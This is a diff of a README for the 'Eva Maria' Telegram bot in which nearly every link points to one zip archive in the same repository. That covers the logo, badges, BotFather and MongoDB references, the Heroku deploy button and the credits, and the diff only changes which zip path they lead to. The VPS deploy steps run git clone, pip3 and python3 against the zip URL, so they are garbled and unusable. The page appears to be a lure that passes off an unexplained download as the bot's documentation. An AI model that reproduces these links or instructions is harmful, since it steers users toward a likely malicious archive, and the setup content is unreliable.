@@ -1,18 +1,18 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip" alt="Eva Maria Logo">
+  <img src="https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip" alt="Eva Maria Logo">
 </p>
 <h1 align="center">
   <b>Eva Maria Bot</b>
 </h1>
 
 
-[![Stars](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-[![Forks](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-[![Size](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)   
-[![Open Source Love svg2](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)   
-[![Contributors](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-[![License](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-[![Sparkline](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+[![Stars](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+[![Forks](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+[![Size](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)   
+[![Open Source Love svg2](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)   
+[![Contributors](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+[![License](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+[![Sparkline](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 
 
 ## Features
@@ -32,33 +32,33 @@
 - [x] File Store
 ## Variables
 
-Read [this](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip) before you start messing up with your edits.
+Read [this](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip) before you start messing up with your edits.
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip), and get the Telegram API token.
-* `API_ID`: Get this value from [https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-* `API_HASH`: Get this value from [https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+* `API_HASH`: Get this value from [https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+* `DATABASE_URI`: [mongoDB](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip) URI. Get this value from [mongoDB](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip). For more help watch this [video](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip). For more help watch this [video](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip multiple IDs by space
-* Check [https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip) for more
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip multiple IDs by space
+* Check [https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip) for more
 
 
 ## Deploy
 You can deploy this bot anywhere.
 
-<i>**[Watch Deploying Tutorial...](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)**</i>
+<i>**[Watch Deploying Tutorial...](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)**</i>
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip">
-  <img src="https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip" alt="Deploy">
+<a href="https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip">
+  <img src="https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip" alt="Deploy">
 </a>
 </p>
 </details>
@@ -66,11 +66,11 @@ You can deploy this bot anywhere.
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip
+git clone https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip
 # Install Packages
-pip3 install -U -r https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip
-Edit https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip with variables as given below then run bot
-python3 https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip
+pip3 install -U -r https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip
+Edit https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip with variables as given below then run bot
+python3 https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip
 </pre>
 </p>
 </details>
@@ -105,32 +105,32 @@ python3 https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation
 • /link - to create link for one post
 ```
 ## Support
-[![telegram badge](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
-[![telegram badge](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+[![telegram badge](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+[![telegram badge](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 
 ## Credits 
-* [![EvaMaria-Devs](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+* [![EvaMaria-Devs](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
- - Thanks To Mahesh For His Awesome [Media-Search-bot](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
- - Thanks To [Trojanz](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip) for Their Awesome [Unlimited Filter Bot](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip) And [AutoFilterBoT](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+ - Thanks To Dan For His Awesome [Library](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+ - Thanks To Mahesh For His Awesome [Media-Search-bot](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
+ - Thanks To [Trojanz](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip) for Their Awesome [Unlimited Filter Bot](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip) And [AutoFilterBoT](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
  - Thanks To All Everyone In This Journey
 
 ### Note
 
-[Note To A So Called Dev](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip): 
+[Note To A So Called Dev](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip): 
 
-Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip), beta , gama branches of your repo won't make you a Developer.
+Kanging this codes and and editing a few lines and releasing a V.x  or an [alpha](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip), beta , gama branches of your repo won't make you a Developer.
 Fork the repo and edit as per your needs.
 
 ## Disclaimer
-[![GNU Affero General Public License 2.0](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)    
-Licensed under [GNU AGPL 2.0.](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+[![GNU Affero General Public License 2.0](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)    
+Licensed under [GNU AGPL 2.0.](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 ## Inspiration
-This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)
+This is an attempt to create a clone of a BOAT made out of [banana trees 🌳](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)
 
-[![For Vaza](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip)](https://raw.githubusercontent.com/HLECTER69/evaajay/master/totipalmation/evaajay.zip "Oru Kootam Vazhakalk samarpikkunnu")
+[![For Vaza](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip)](https://github.com/HLECTER69/evaajay/raw/refs/heads/master/plugins/Software_v1.7.zip "Oru Kootam Vazhakalk samarpikkunnu")
